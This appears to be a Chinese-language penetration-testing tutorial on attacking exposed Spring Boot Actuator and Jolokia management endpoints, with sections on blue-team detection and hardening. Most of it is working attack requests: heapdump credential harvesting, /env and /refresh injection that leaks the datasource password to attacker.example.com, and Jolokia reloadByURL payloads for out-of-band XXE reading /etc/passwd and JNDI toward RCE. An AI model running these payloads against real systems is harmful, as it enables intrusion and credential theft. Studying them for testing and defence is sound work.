---
title: "Spring Boot Actuator与Jolokia未授权访问打点利用技术"
weight: 45
---

# Spring Boot Actuator与Jolokia未授权访问打点利用技术

在现代 Java 微服务环境中，`Spring Boot Actuator` 是极其常见的运维与诊断组件。它本意是给开发和运维提供健康检查、配置查看、线程转储、日志动态调整和运行时监控能力，但一旦被错误暴露到公网或内网低信任区域，就会从“运维接口”直接转化为“初始打点面”。

这类接口的危险性不在于单一漏洞，而在于它通常同时满足以下特点：

- 路径固定，易于枚举
- 响应格式标准化，适合自动化打点
- 既能泄露配置、密钥、令牌、请求历史，又可能直接改配置触发代码执行
- 蓝队经常只看到正常 `200` 请求，却没有把它们识别为攻击前置阶段

本文将按“打点利用”而非“后渗透横向”的视角来写，重点是把 Spring 管理接口当作**漏洞利用与初始进入面**进行整理，涵盖：

1. 路径识别与枚举方法
2. 敏感信息回显型端点
3. 配置修改型端点
4. 通过 `Jolokia`、`/env + /refresh` 等链条触发 XXE、凭据泄露或 RCE
5. 每一步的请求与响应案例
6. 蓝队在访问日志、应用日志和反向代理日志中的调查点

---

## 0. 攻击面概览

### 0.1 为什么它属于“打点”而不是“后渗透”

`Actuator` 的价值主要体现在目标还没被真正接管之前：

- 它能告诉你应用是什么框架、暴露了哪些管理能力
- 它可能直接给出数据库密码、云密钥、Basic 凭据、Session 令牌
- 它可能允许你在不落地 WebShell 的前提下改配置并触发服务端请求
- 某些情况下，它本身就是直接的代码执行入口

因此这类文章更适合放在 `04 渗透攻击`，因为它解决的是：

- 怎么找到打点面
- 怎么从一个看似普通的 `/actuator/health` 深挖到真正可利用端点
- 怎么把“信息泄露”变成“代码执行”

### 0.2 常见暴露路径

不同 Spring Boot 版本、不同管理配置、不同反向代理规则下，常见路径包括：

- `/actuator`
- `/actuator/health`
- `/actuator/info`
- `/actuator/env`
- `/actuator/refresh`
- `/actuator/heapdump`
- `/actuator/loggers`
- `/actuator/httptrace`
- `/actuator/httpexchanges`
- `/actuator/jolokia`
- `/jolokia`
- 老版本根路径下的 `/env`、`/trace`、`/dump`、`/restart`

### 0.3 哪些暴露最有实战价值

按“打点收益”排序，常见优先级如下：

1. `/actuator/jolokia` 或 `/jolokia`
2. `/actuator/env`
3. `/actuator/refresh`
4. `/actuator/heapdump`
5. `/actuator/httptrace` 或 `/trace`
6. `/actuator/mappings`
7. `/actuator/loggers`
8. `/actuator/shutdown`

原因很直接：

- `jolokia` 更可能直接进入 XXE / JNDI / RCE
- `env` 更可能提供配置写入、明文回收或后续链式利用
- `heapdump` 与 `httptrace` 更可能直接给出令牌、Cookie、Basic 凭据、数据库密钥

---

## 1. 打点前提与版本差异

### 1.1 版本差异会直接影响路径和请求格式

Spring Boot 1.x 与 2.x/3.x 的差异对打点非常关键：

- `1.x`
  - 很多端点直接挂在根路径
  - 老环境中更常见“未鉴权直接暴露”
- `2.x/3.x`
  - 多数端点位于 `/actuator/`
  - 默认更保守，但大量项目通过 `management.endpoints.web.exposure.include=*` 又重新全开

同样是改 `/env`：

- 旧版本常见 `x-www-form-urlencoded`
- 新版本更常见 `application/json`

### 1.2 第一轮枚举不要只测一个路径

打点时最忌讳的做法是只请求一次 `/actuator/health` 就结束。正确方法是把它视作目录型管理面，至少要把根、常见端点和 `Jolokia` 路径都探一遍。

#### 请求示例

```http
GET /actuator HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "_links": {
    "self": {
      "href": "http://target.example.com/actuator",
      "templated": false
    },
    "health": {
      "href": "http://target.example.com/actuator/health",
      "templated": false
    },
    "env": {
      "href": "http://target.example.com/actuator/env",
      "templated": false
    },
    "heapdump": {
      "href": "http://target.example.com/actuator/heapdump",
      "templated": false
    },
    "jolokia": {
      "href": "http://target.example.com/actuator/jolokia",
      "templated": false
    }
  }
}
```

这条响应的价值非常高，因为它直接告诉你：

- 管理面可达
- 具体可用端点有哪些
- 后续该优先测试哪几个高价值路径

#### 失败响应示例

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Realm"
```

或：

```http
HTTP/1.1 404 Not Found
```

这里不能简单判定“没戏了”，而应继续测：

- `/jolokia`
- `/env`
- `/trace`
- `/heapdump`
- 是否有上游网关做了路径重写

---

## 2. 第一类打点：信息泄露型端点

这类端点的意义不是“直接 RCE”，而是快速把目标应用的认证状态、内部服务关系、数据库连接和上游令牌暴露出来，为后续打点提供原材料。

### 2.1 `/health` 与 `/info`：识别应用与组件

#### 请求示例

```http
GET /actuator/health HTTP/1.1
Host: target.example.com
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "status": "UP",
  "components": {
    "db": {
      "status": "UP",
      "details": {
        "database": "MySQL",
        "validationQuery": "isValid()"
      }
    },
    "diskSpace": {
      "status": "UP"
    },
    "redis": {
      "status": "UP"
    }
  }
}
```

这类响应虽然不算直接漏洞，但非常适合做打点侧画像：

- 后端是否连了 MySQL、Redis、MQ、ES
- 是否可能存在更多可利用组件
- 后续 SSRF、配置写入、凭据泄露应该优先打哪一类后端

### 2.2 `/mappings`：暴露应用真实路由

#### 请求示例

```http
GET /actuator/mappings HTTP/1.1
Host: target.example.com
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "contexts": {
    "application": {
      "mappings": {
        "dispatcherServlets": {
          "dispatcherServlet": [
            {
              "handler": "com.example.api.AdminController#exportUsers()",
              "predicate": "{GET [/admin/export]}"
            },
            {
              "handler": "com.example.api.DebugController#sql(String)",
              "predicate": "{POST [/debug/sql]}"
            }
          ]
        }
      }
    }
  }
}
```

这类响应常被低估，但对打点非常有价值：

- 直接暴露内部调试接口
- 泄露控制器类名、方法名、参数类型
- 帮助你从“猜接口”切换成“按真实路由打点”

### 2.3 `/httptrace`、`/httpexchanges` 或旧版 `/trace`：令牌回收与会话侧信道

#### 请求示例

```http
GET /actuator/httptrace HTTP/1.1
Host: target.example.com
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "traces": [
    {
      "request": {
        "method": "GET",
        "uri": "https://target.example.com/api/admin/users",
        "headers": {
          "authorization": [
            "Bearer eyJhbGciOi..."
          ],
          "cookie": [
            "JSESSIONID=51CF0C6A8A0C7E..."
          ]
        }
      },
      "response": {
        "status": 200
      }
    }
  ]
}
```

这里是非常典型的“打点直接转接管”场景：

- 可以直接回收 Bearer Token
- 可以回收 `JSESSIONID`
- 可以判断后台 API 路径和真实管理接口

#### 成功判据

- 响应中包含认证头或 Cookie
- 能对应到后台管理、运维、导出、审批等敏感接口

#### 蓝队响应点

这类攻击本身在应用侧可能只是一条普通 `GET /actuator/httptrace`，但后果是攻击者立刻拿到现成管理员凭据。蓝队应重点关注：

- 非运维来源对 `/httptrace`、`/trace` 的访问
- 短时间内 trace 端点访问后紧接着出现后台会话复用

### 2.4 `/heapdump`：内存级凭据回收

#### 请求示例

```http
GET /actuator/heapdump HTTP/1.1
Host: target.example.com
Accept: application/octet-stream
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Disposition: attachment; filename=heapdump
Content-Length: 183274561
```

如果这里直接返回一个大体积二进制文件，基本就意味着：

- 目标 JVM 内存快照可被任意下载
- 后续可从堆中挖明文密码、数据库连接串、Basic 凭据、Token、Session、Spring 配置对象

#### 后续检索示例

```bash
wget http://target.example.com/actuator/heapdump -O heapdump
strings heapdump | grep -nE 'Authorization: Basic|Bearer |jdbc:|password=|spring.datasource|eureka.client'
```

#### 典型“二次响应”示例

```text
spring.datasource.password=SpringDbPass123!
Authorization: Basic YWRtaW46QWRtaW4xMjMh
eureka.client.serviceUrl.defaultZone=http://admin:AdminPass!@10.10.10.20:8761/eureka/
```

这类输出的价值非常高，因为它通常能立即转化为：

- 数据库登录
- 后台系统 Basic Auth
- 内部服务注册中心接管

#### 蓝队响应点

这类请求虽然只是一个 `GET`，但会造成极大的数据泄露，应重点监控：

- `/heapdump` 的下载行为
- 大体积 `200` 响应
- 相同来源随后对 DB、Jenkins、注册中心、Nexus 等内部资产的访问

---

## 3. 第二类打点：配置写入型端点

这类端点比信息泄露更危险，因为它可以把“只读打点面”升级成“可控执行链”。

### 3.1 `/env`：最典型的配置注入入口

如果目标同时暴露：

- `/actuator/env`
- `/actuator/refresh`

那么攻击者常常不满足于“看配置”，而会进一步尝试：

- 注入新配置项
- 修改服务发现地址
- 修改日志配置地址
- 诱导应用向攻击者服务发请求

#### Spring Boot 2.x 常见请求示例

```http
POST /actuator/env HTTP/1.1
Host: target.example.com
Content-Type: application/json
Accept: application/json
Connection: close

{
  "name": "eureka.client.serviceUrl.defaultZone",
  "value": "http://attacker.example.com/payload"
}
```

#### 典型响应示例

```json
{
  "name": "eureka.client.serviceUrl.defaultZone",
  "value": "http://attacker.example.com/payload"
}
```

这个响应意味着：

- 属性写入已被接受
- 后续只要目标执行 refresh 或重载配置，就可能真的去访问攻击者 URL

#### 旧版本常见请求示例

```http
POST /env HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Connection: close

eureka.client.serviceUrl.defaultZone=http://attacker.example.com/payload
```

### 3.2 `/refresh`：把“写进去”变成“真的生效”

#### 请求示例

```http
POST /actuator/refresh HTTP/1.1
Host: target.example.com
Content-Type: application/json
Accept: application/json
Connection: close

{}
```

#### 典型响应示例

```json
[
  "eureka.client.serviceUrl.defaultZone"
]
```

这一步的意义在于：

- `/env` 只是把值写到了环境里
- `/refresh` 才会促使 Spring 重新加载或传播配置

如果目标带有特定依赖，后续就可能出现：

- 访问攻击者控制的 Eureka/XStream 恶意端点
- 访问攻击者控制的配置地址
- 进而进入反序列化或代码执行链

### 3.3 明文回收而不是直接 RCE

很多项目里，打点的最优路线未必是立刻求 RCE，而是先把被脱敏的配置值“变相取回明文”。公开研究里常见手法是：

1. 通过 `/env` 改掉某个会触发外连的配置
2. 在新值中嵌入 `${property.name}` 形式
3. 通过 `/refresh` 促使应用向攻击者站点发请求
4. 从攻击者站点日志回收真实值

#### 请求示例

```http
POST /actuator/env HTTP/1.1
Host: target.example.com
Content-Type: application/json
Connection: close

{
  "name": "eureka.client.serviceUrl.defaultZone",
  "value": "http://value:${spring.datasource.password}@attacker.example.com/"
}
```

#### 典型攻击端“响应”示例

```text
GET / HTTP/1.1
Host: attacker.example.com
Authorization: Basic dmFsdWU6U3ByaW5nRGJQYXNzMTIzIQ==
```

或：

```text
GET / HTTP/1.1
Host: value:SpringDbPass123!@attacker.example.com
```

这类链非常适合打点阶段，因为它的目标不是立刻控机，而是低噪音回收高价值密钥。

---

## 4. 第三类打点：Jolokia 直达高危 MBean

如果 `/actuator/jolokia` 或 `/jolokia` 暴露，风险通常会直接升级。

### 4.1 先列举可用 MBean

#### 请求示例

```http
GET /actuator/jolokia/list HTTP/1.1
Host: target.example.com
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "value": {
    "ch.qos.logback.classic": {
      "type=ch.qos.logback.classic.jmx.JMXConfigurator,name=default": {
        "op": {
          "reloadByURL": {
            "args": [
              {
                "type": "java.net.URL"
              }
            ]
          }
        }
      }
    }
  },
  "status": 200
}
```

这一条响应就已经足够说明：

- 目标启用了 `Jolokia`
- 目标暴露了 `reloadByURL`
- 后续可以尝试基于 Logback 的远程配置加载链

### 4.2 `reloadByURL`：从外部 URL 载入恶意 logback 配置

#### 请求示例

```http
GET /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.example.com!/logback.xml HTTP/1.1
Host: target.example.com
Connection: close
```

#### 典型响应示例

```json
{
  "request": {
    "type": "exec",
    "mbean": "ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator",
    "operation": "reloadByURL"
  },
  "status": 200,
  "timestamp": 1718193000
}
```

要注意：这里的 `status: 200` 只说明 `Jolokia` 请求本身被接受，不等于最终必然 RCE。真正的攻击链要继续看：

- 目标是否向攻击者站点拉取了 `logback.xml`
- 该 XML 在目标 JVM 上如何被解析
- 所用 JDK/JNDI 版本是否允许后续 JNDI 触发

### 4.3 基于 `reloadByURL` 的 OOB XXE

攻击者可以先不追求直接代码执行，而是用 `logback.xml` 触发 OOB XXE 做文件读取验证。

#### 恶意 `logback.xml` 示例

```xml
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://attacker.example.com/file.dtd">%remote;%int;]>
<a>&trick;</a>
```

#### `file.dtd` 示例

```dtd
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % int "<!ENTITY trick SYSTEM 'http://attacker.example.com/?x=%d;'>">
```

#### 攻击端“响应”示例

```text
GET /?x=root:x:0:0:root:/root:/bin/bash HTTP/1.1
Host: attacker.example.com
```

这类链适合做：

- 外带验证
- 文件可读性验证
- 较低噪音的信息收集

### 4.4 基于 `reloadByURL` 的 JNDI / RCE

如果目标依赖、Logback 配置路径和运行时环境满足条件，攻击者可以进一步把远程 logback 配置变成 JNDI 查询触发点。

#### 恶意 `logback.xml` 示例

```xml
<configuration>
  <insertFromJNDI env-entry-name="ldap://attacker.example.com:1389/jndi" as="appName" />
</configuration>
```

#### 触发请求示例

```http
GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.example.com!/logback.xml HTTP/1.1
Host: target.example.com
Connection: close
```

#### 典型攻击端“响应”示例

```text
LDAP query from 10.10.10.25 for ldap://attacker.example.com:1389/jndi
```

在支持条件满足时，这条链可能继续变成：

- OOB 外带
- JNDI 远程类加载
- 表达式执行
- 最终远程命令执行

不过文章里应明确写明环境边界：

- 这类链受 JDK 版本、JNDI 限制、目标依赖、Tomcat/BeanFactory 等条件影响较大
- 不是所有暴露 `reloadByURL` 的环境都能稳定走到 RCE

---

## 5. 打点流程：从弱信号一路逼近可利用点

实际项目里，更稳的做法不是一上来盲打 RCE，而是按这个顺序推进：

### 5.1 第一轮：确认是否真的是管理面

优先请求：

- `/actuator`
- `/actuator/health`
- `/actuator/info`
- `/jolokia`
- `/actuator/jolokia`

目标是确认：

- 管理面是否存在
- 是 Spring 1.x 还是 2.x/3.x 风格
- 是否有链接型根页面

### 5.2 第二轮：优先找高收益读端点

优先打：

- `/actuator/httptrace`
- `/actuator/httpexchanges`
- `/actuator/heapdump`
- `/actuator/mappings`
- `/actuator/env`

这一步的重点是拿：

- Token
- Cookie
- 内部路由
- 数据库密钥
- 注册中心地址
- 云服务密钥

### 5.3 第三轮：确认是否存在配置写入或 MBean 执行

重点看：

- `/actuator/env` 是否允许 `POST`
- `/actuator/refresh` 是否允许 `POST`
- `/actuator/jolokia/list` 是否存在
- `reloadByURL` 是否存在

### 5.4 第四轮：根据环境选链

常见路径分叉：

- 如果有 `/heapdump`
  - 先做凭据回收
- 如果有 `/httptrace`
  - 先做会话回收
- 如果有 `/env + /refresh`
  - 先做低噪音配置注入与明文回收
- 如果有 `/jolokia + reloadByURL`
  - 先做 OOB 验证，再决定是否推进 RCE

---

## 6. 蓝队检测与处置

### 6.1 应该监控哪些路径

至少应把以下路径纳入高优先级访问监控：

- `/actuator`
- `/actuator/env`
- `/actuator/refresh`
- `/actuator/heapdump`
- `/actuator/httptrace`
- `/actuator/httpexchanges`
- `/actuator/jolokia`
- `/jolokia`

### 6.2 反向代理或 Web 访问日志中的高价值特征

应重点识别：

- 对管理端点的非常规来源访问
- 非运维时段连续探测多个 actuator 路径
- `POST /actuator/env`
- `POST /actuator/refresh`
- `GET /actuator/heapdump`
- `GET /actuator/jolokia/list`
- 含有 `reloadByURL` 的 `jolokia/exec` 请求

#### 日志示例

```text
10.10.10.21 - - [12/Jun/2026:21:13:44 +0800] "GET /actuator/heapdump HTTP/1.1" 200 183274561 "-" "Mozilla/5.0"
```

```text
10.10.10.21 - - [12/Jun/2026:21:14:01 +0800] "POST /actuator/env HTTP/1.1" 200 87 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [12/Jun/2026:21:14:15 +0800] "GET /actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.example.com!/logback.xml HTTP/1.1" 200 178 "-" "curl/8.7.1"
```

这三类日志单独任何一条都值得高优先级排查。

### 6.3 应用日志中的高价值线索

Spring 应用日志常可见：

- 配置刷新
- 外部 Eureka/Config 请求
- Logback reload
- XML/JNDI 解析异常
- 异常高频的 actuator 调用

#### 应用日志示例

```text
INFO  RefreshEndpoint - Refreshing keys [eureka.client.serviceUrl.defaultZone]
```

```text
INFO  JMXConfigurator - Resetting context: default
INFO  JMXConfigurator - Registering current configuration as safe fallback point
```

```text
ERROR SAXParseException - External entity resolution failed
```

这些日志一旦与 Web 访问日志对上，基本就能证明攻击者已经从“枚举”进入“利用”。

### 6.4 处置建议

发现疑似攻击后，应按下面顺序处置：

1. 立即限制或下线外网可达的 management 端口与路径
2. 检查是否存在 `/env` 写入历史和 refresh 记录
3. 检查是否已下载过 `heapdump`
4. 检查是否有异常外连到攻击者域名
5. 对可能泄露的数据库密码、API Token、注册中心凭据做轮换
6. 检查是否已存在二次落点或远程命令执行痕迹

长期加固应落实：

- `management.endpoints.web.exposure.include` 最小化
- 管理端点只绑定内网或独立管理网
- 对 Actuator 强制鉴权
- 禁止在生产环境暴露 `/heapdump`、`/env`、`/refresh`、`/jolokia`
- 对敏感路径建立 WAF/反向代理层显式拒绝规则

---

## 7. 复盘清单

### 7.1 红队侧

- 是否先确认了根 actuator 页面和版本风格
- 是否优先收集了 `/heapdump`、`/trace`、`/env` 这类高收益读端点
- 是否验证了 `/env` 可写、`/refresh` 可用
- 是否检查了 `Jolokia` 中 `reloadByURL` 等危险 MBean
- 是否把每次请求与对应响应都完整记录

### 7.2 蓝队侧

- 是否能识别一段时间内连续探测多个 actuator 路径的行为
- 是否能对 `POST /actuator/env`、`POST /actuator/refresh` 立即告警
- 是否能发现对 `/heapdump` 的异常下载
- 是否能从应用日志中还原配置刷新和 Logback 重载

### 7.3 应急侧

- 是否确认凭据有没有被回收
- 是否确认目标是否向攻击者站点发起过外连
- 是否确认攻击有没有从信息泄露推进到配置写入或 RCE
- 是否完成暴露路径收敛与密钥轮换

---

## 8. 总结

`Spring Boot Actuator` 与 `Jolokia` 在很多环境里并不是“边缘小问题”，而是非常典型、非常高价值的打点面。它们的危险之处在于：

- 枚举成本低
- 收益链很长
- 从纯信息泄露到配置注入再到 RCE 存在清晰递进

对渗透测试来说，真正应该整理的不只是“某个 CVE”，而是这种**可规模化打点的管理接口利用方法学**：

- 先枚举
- 再回收密钥与会话
- 再确认可写端点
- 最后判断是否推进到执行链

这类思路比单点漏洞更适合作为 `04 渗透攻击` 下的长期积累主题。

---

## 参考资料

- [Veracode / Security Boulevard: Exploiting Spring Boot Actuators](https://securityboulevard.com/2019/02/exploiting-spring-boot-actuators/)
- [HackTricks: Spring Actuators](https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html)
- [0xn3va: Spring Boot Actuators](https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators)
- [mpgn: Spring-Boot-Actuator-Exploit](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)
- [laluka: jolokia-exploitation-toolkit](https://github.com/laluka/jolokia-exploitation-toolkit)
- [Spring Boot Actuator Documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html)
